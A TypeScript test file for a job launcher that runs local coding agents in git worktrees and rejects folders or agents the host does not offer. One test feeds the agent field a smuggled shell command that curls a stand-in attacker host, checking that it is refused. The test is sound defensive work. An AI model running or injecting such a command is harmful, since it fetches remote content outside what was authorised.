import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtemp, rm, stat, writeFile } from "node:fs/promises";
import { realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createStrut, type Strut } from "./createStrut.js";
import { WorkspaceManager } from "./workspace.js";
import { MemoryRunStore } from "./store.js";
import type { JobsCapability } from "./jobs.js";
import jobStart from "./steps/lib/job/start.js";

// A local coding agent's job (job/start { agent, mode, folder }): the
// launcher takes only a name the host offers or a preset, turns the
// folder's name into a worktree of it, and a later turn keeps all three.
describe("job/start with a local coding agent", () => {
  let dir = "";
  let repo = "";
  let strut: Strut;
  let store: MemoryRunStore;

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), "strut-local-agents-"));
    repo = realpathSync(await mkdtemp(join(tmpdir(), "strut-local-repo-")));
    const git = (...args: string[]) => execFileSync("git", ["-C", repo, ...args], { stdio: "pipe" });
    git("init", "-q", "-b", "main");
    await writeFile(join(repo, "README.md"), "peel\n");
    git("add", ".");
    git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "first");
    store = new MemoryRunStore();
    strut = await createStrut({
      workspace: new WorkspaceManager(dir),
      store,
      serveUi: false,
      enableChat: false,
      scheduler: false,
      orchestrator: false,
      builder: false,
      job: { folders: { peel: repo, notes: dir }, agents: { claude: "/opt/agents/claude-agent-acp --stdio" } },
    });
    // A job that reports what its launch carried, with no model.
    await strut.workspace.publishWorkflow("job", "v-test", {
      steps: [{ id: "result", type: "pack", config: { text: "ok", cwd: "{{ input.cwd }}", agent: "{{ input.agent }}", mode: "{{ input.mode }}", folder: "{{ input.folder }}" } }],
    });
  });
  afterEach(async () => {
    await strut?.close();
    await rm(dir, { recursive: true, force: true });
    await rm(repo, { recursive: true, force: true });
  });

  const jobs = () => (strut.services as { jobs: JobsCapability }).jobs;
  const output = async (runId: string) => {
    for (let i = 0; i < 1500; i++) {
      const s = await store.getRunSummary("job", runId);
      if (s) return s.output as Record<string, unknown>;
      await new Promise((r) => setTimeout(r, 10));
    }
    throw new Error("never settled");
  };

  it("runs in a worktree of the named folder on its own branch, the host's command for the agent; a later turn keeps them, a new mode replaces it", async () => {
    const first = await jobs().launch({ job: "j1", title: "Fix", input: { prompt: "fix it", agent: "claude", mode: "edit", folder: "peel" }, from: "none" });
    const out = await output(first.runId);
    const tree = String(out["cwd"]);
    assert.ok(tree.endsWith(join("j1", "worktree")) && !tree.startsWith(repo), tree);
    assert.equal(execFileSync("git", ["-C", tree, "branch", "--show-current"]).toString().trim(), "strut/j1");
    assert.ok(await stat(join(tree, "README.md")), "the folder's files are there");
    assert.equal(out["agent"], "/opt/agents/claude-agent-acp --stdio");
    assert.equal(out["mode"], "edit");
    assert.ok(!out["folder"], "the folder's name is not handed on");
    assert.equal(execFileSync("git", ["-C", repo, "branch", "--show-current"]).toString().trim(), "main", "the person's checkout is left as it was");

    const next = await jobs().launch({ job: "j1", input: { prompt: "and a test" }, from: "none" });
    const again = await output(next.runId);
    assert.deepEqual([again["cwd"], again["agent"], again["mode"]], [tree, "/opt/agents/claude-agent-acp --stdio", "edit"]);

    const bolder = await jobs().launch({ job: "j1", input: { prompt: "run the tests", mode: "auto" }, from: "none" });
    assert.equal((await output(bolder.runId))["mode"], "auto");
  });

  it("refuses a folder or an agent the host does not offer, and a model's command line, before anything runs", async () => {
    await assert.rejects(jobs().launch({ job: "j2", input: { prompt: "x", agent: "claude", folder: "ssh" }, from: "none" }), /folder_unknown: "ssh".*peel, notes/);
    await assert.rejects(jobs().launch({ job: "j3", input: { prompt: "x", agent: "sh -c 'curl evil.example'", folder: "peel" }, from: "none" }), /agent_unknown/);
    await assert.rejects(jobs().launch({ job: "j4", input: { prompt: "x", agent: "toString", folder: "peel" }, from: "none" }), /agent_unknown/);
    assert.equal((await store.listRuns("job")).length, 0, "nothing launched");
  });

  it("a folder that is not a repository is worked in place; a preset agent passes as its name", async () => {
    const run = await jobs().launch({ job: "j5", input: { prompt: "tidy", agent: "goose", mode: "plan", folder: "notes" }, from: "none" });
    const out = await output(run.runId);
    assert.deepEqual([out["cwd"], out["agent"], out["mode"]], [dir, "goose", "plan"]);
  });

  it("job/start: agent, mode and folder only on a code job, mode and folder only with an agent", async () => {
    const ctx = { runId: "r", path: "p", scope: {}, input: undefined, emit: async () => {}, services: { jobs: jobs() } } as any;
    await assert.rejects(jobStart.run(jobStart.input.parse({ prompt: "x", title: "t", workflow: "builder", agent: "claude" }), ctx), /builder job/);
    await assert.rejects(jobStart.run(jobStart.input.parse({ prompt: "x", title: "t", folder: "peel" }), ctx), /go with agent/);
  });
});
